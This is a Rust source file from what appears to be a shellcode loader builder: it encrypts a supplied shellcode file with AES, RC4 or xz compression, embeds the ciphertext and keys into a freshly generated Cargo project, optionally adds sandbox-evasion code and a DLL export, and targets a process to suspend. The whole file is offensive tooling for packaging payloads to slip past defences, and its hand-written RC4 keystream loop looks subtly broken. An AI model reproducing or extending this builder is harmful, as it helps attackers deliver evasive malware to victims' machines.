#![allow(warnings)]
use base64::encode;
use libaes::Cipher;
use rand::Rng;
use std::fs;
use std::fs::File;
use std::io::{Read, Write};

use block_modes::block_padding::Pkcs7;
use block_modes::{BlockMode, Cbc};
use my_lib::{
    code_snippet, main_imports, maincargo, aesdecryption, aescargo, aesimports, auxcargo,
    dllstruct, elzmacargo, elzmadecryption, elzmaimports, rc4decryption, rc4cargo, rc4imports, sandboximports, sandboxstruct, sandboxcargo};
use std::process::Command;
use xz2::write::XzEncoder;

pub fn setupcargo(shellcodefile: &str, project_name: &str, encryption_method: &str, process: &str, export: Option<&str>, dll_mode: bool, sandbox: bool) {
    println!("[!] Selected Process to Suspend: {}", process);
    let (mut encrypted, mut key, mut iv) = encryption(shellcodefile, encryption_method);
    let output = Command::new("cargo")
        .args(&["new", project_name])
        .output()
        .expect("Failed to create a new Rust project");
    println!(
        "[*] Created new Rust project: {}",project_name);
    let cargo_toml_path = format!("{}/Cargo.toml", project_name);
    let mut cargo_toml = std::fs::OpenOptions::new()
        .append(true)
        .open(cargo_toml_path)
        .expect("Failed to open Cargo.toml");
    let mut main_dependency = format!(r#"{}"#, maincargo(),);
    let mut encryption_dependency: String = "".to_string();
    if encryption_method == "ELZMA" {
        encryption_dependency = format!(r#"{}"#, elzmacargo(),);
    } else if encryption_method == "AES" {
        encryption_dependency = format!(r#"{}"#, aescargo(),);
    } else if encryption_method == "RC4" {
        encryption_dependency = format!(r#"{}"#, rc4cargo(),);
    }
    let mut sandbox_dependency: String = "".to_string();
    if sandbox == true {
        sandbox_dependency = format!("{}", sandboxcargo())
    } else {
        sandbox_dependency = format!("");
    }
    
    let compileflags = format!(r#"{}"#, auxcargo(),);
    let mut dependency = format!(
        "{}{}{}{}",
        main_dependency, sandbox_dependency, encryption_dependency, compileflags
    );
    if sandbox == true {
        dependency = format!("{}\n{}", dependency, sandboxcargo())
    } else {
        dependency = format!(r#"{}"#, dependency);
    }

    if dll_mode == true {
        let mut libdependency = format!("\n[lib]\ncrate-type = [\"cdylib\"]\n",);
        dependency = format!("{}{}", dependency, libdependency);
    }
    writeln!(cargo_toml, "{}", dependency).expect(" [!] Failed to write to Cargo.toml");
    println!("[*] Added dependency to Cargo.toml");
    let mut main_rs_path = format!("{}/src/main.rs", project_name);
    let executable_name = process;
    let mut encryption_dependency: String = "".to_string();
    let mut main_rs_content: String = "".to_string();

    if sandbox == true {
        main_rs_content = format!("{}\n{}", code_snippet(executable_name), sandboxstruct())
    } else {
        main_rs_content = format!(r#"{}"#, code_snippet(executable_name),);
    }
    let mut main_rs_imports:  String = "".to_string();

    if sandbox == true {
        main_rs_imports = format!("{}\n{}", main_imports(), sandboximports())
    } else {
        main_rs_imports = format!(r#"{}"#, main_imports(),);
    }

    let mut main_rs_decryption_imports: String = "".to_string();
    let mut main_rs_decryption: String = "".to_string();
    let mut shellcode = format!("static mut ciphertext: &str = \"{}\";\n static mut key: &str = \"{}\";\n static mut iv: &str = \"{}\";\n", encrypted, key, iv);
    if encryption_method == "ELZMA" {
        main_rs_decryption = format!(r#"{}"#, elzmadecryption(),);
        main_rs_decryption_imports = format!(r#"{}"#, elzmaimports(),);
    } else if encryption_method == "AES" {
        main_rs_decryption = format!(r#"{}"#, aesdecryption(),);
        main_rs_decryption_imports = format!(r#"{}"#, aesimports(),);
    } else if encryption_method == "RC4" {
        main_rs_decryption = format!(r#"{}"#, rc4decryption(),);
        main_rs_decryption_imports = format!(r#"{}"#, rc4imports(),);
    }
    
    let mut combined_code = format!(
        "{}{}\n{}\n{}\n{}",
        main_rs_imports, main_rs_decryption_imports, shellcode, main_rs_content, main_rs_decryption
    );
    if dll_mode == true {
        let mut dllexports = format!(r#"{}"#, dllstruct(),);
        combined_code = format!("{}\n{}", combined_code, dllexports);
        if export != None {
            let mut export = export.unwrap();
            let export = format!(
                "#[no_mangle]\n pub extern \"C\" fn {}() {{\n    main()\n}}",
                export
            );
            combined_code = format!("{}\n{}", combined_code, export);
            println!("[!] Added an additional Export function called: {}", export);
        }
    }
    let mut main_rs = File::create(main_rs_path).expect("Failed to open main.rs");
    main_rs
        .write_all(combined_code.as_bytes())
        .expect("[!] Failed to write to main.rs");
    if dll_mode == true {
        let old_file_name = format!("{}/src/main.rs", project_name);
        let new_file_name = format!("{}/src/lib.rs", project_name);
        fs::rename(old_file_name, new_file_name);
    } else {
    }
}

pub fn encryption(shellcodefile: &str, encryption_method: &str) -> (String, String, String) {
    println!(
        "[*] Encrypting Shellcode Using {} Encryption",
        encryption_method
    );
    let mut plaintext = Vec::new();
    let mut file = File::open(&shellcodefile).expect("Unable to open the file");
    file.read_to_end(&mut plaintext)
        .expect("Unable to read the file");
    let mut rng = rand::thread_rng();
    let key: [u8; 32] = rng.gen();
    let iv: [u8; 32] = rng.gen();
    let mut encrypted: String = String::new();
    if encryption_method == "AES" {
        let cipher = Cipher::new_256(&key);
        let encryptedd = cipher.cbc_encrypt(&iv, &plaintext);
        encrypted = encode(&encryptedd);
    }
    if encryption_method == "ELZMA" {
        let mut encoder = XzEncoder::new(Vec::new(), 9);
        encoder.write_all(&plaintext).unwrap();
        let compressed = encoder.finish().unwrap();
        encrypted = encode(&compressed);
    }
    if encryption_method == "RC4" {
        let mut s: [u8; 256] = [0; 256];
        let mut k: [u8; 256] = [0; 256];

        for i in 0..256 {
            s[i] = i as u8;
            k[i] = key[i % key.len()];
        }
        let mut j: usize = 0;
        for i in 0..256 {
            j = (j + s[i] as usize + k[i] as usize) % 256;
            s.swap(i, j);
        }
        let mut i: usize = 0;
        let mut j: usize = 0;
        for x in plaintext.iter_mut() {
            i = (i + 1) % 256;
            j = (j + s[i] as usize + k[i] as usize) % 256;
            s.swap(i, j);
            let t = (s[i] as usize + s[j] as usize) % 256;
            *x ^= s[t];
        }
        encrypted = encode(&plaintext);
    }
    println!("[*] Shellcode Encrypted");
    (encrypted, base64::encode(key), base64::encode(iv))
}
